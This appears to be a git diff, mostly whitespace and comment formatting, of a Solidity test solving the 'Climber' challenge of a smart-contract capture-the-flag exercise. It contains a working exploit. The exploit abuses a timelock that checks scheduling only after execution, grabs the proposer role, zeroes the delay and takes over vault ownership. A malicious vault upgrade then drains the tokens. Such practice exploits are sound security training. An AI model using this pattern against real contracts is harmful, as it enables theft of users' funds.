@@ -88,11 +88,11 @@ contract ClimberChallenge is Test {
     function test_climber() public checkSolvedByPlayer {
         ClimberExploit exploit = new ClimberExploit(payable(timelock), address(vault));
         exploit.timelockExecute(); // executing 4 calls, with first 3 for hacking, 4th for scheduling
-        MalVault malVault = new MalVault(); 
+        MalVault malVault = new MalVault();
 
         // upgrade vault to malicious implementation
         vault.upgradeToAndCall(address(malVault), "");
-        MalVault(address(vault)).withdrawAll(address(token), recovery); 
+        MalVault(address(vault)).withdrawAll(address(token), recovery);
     }
 
     /**
@@ -104,13 +104,11 @@ contract ClimberChallenge is Test {
     }
 }
 
-
-
 /**
- * as checks are performed after the execution, 
+ * as checks are performed after the execution,
  * we will not schedule the calls to be executed, to avoid waiting
- * instead we will put mal calls before, and in the last call we will schedule the call 
-*/
+ * instead we will put mal calls before, and in the last call we will schedule the call
+ */
 contract ClimberExploit {
     address payable immutable timelock;
     uint256[] private _values = [0, 0, 0, 0]; // no eth transfer
@@ -121,11 +119,10 @@ contract ClimberExploit {
         timelock = _timelock;
 
         // setting up the attack sequence
-        _targets  = [_timelock, _timelock, _vault, address(this)];
+        _targets = [_timelock, _timelock, _vault, address(this)];
         // grant role of proposer in timelock contract
-        _elements[0] = (
-            abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this))
-        );
+        _elements[0] =
+            (abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this)));
         // set delay to 0
         _elements[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
         // transfer vault ownership to msg.sender
@@ -139,9 +136,9 @@ contract ClimberExploit {
     }
 
     // schedule the calls in timelock, will be called in the last call of timelockExecute
-    // after doing most of the hacking part 
+    // after doing most of the hacking part
     function timelockSchedule() external {
-        ClimberTimelock(timelock).schedule(_targets, _values, _elements, bytes32("123"));   
+        ClimberTimelock(timelock).schedule(_targets, _values, _elements, bytes32("123"));
     }
 }
 
@@ -150,7 +147,7 @@ contract MalVault is ClimberVault {
         _disableInitializers();
     }
 
-    // drain function 
+    // drain function
     function withdrawAll(address _token, address _receiver) external onlyOwner {
         IERC20 token = IERC20(_token);
         token.transfer(_receiver, token.balanceOf(address(this)));
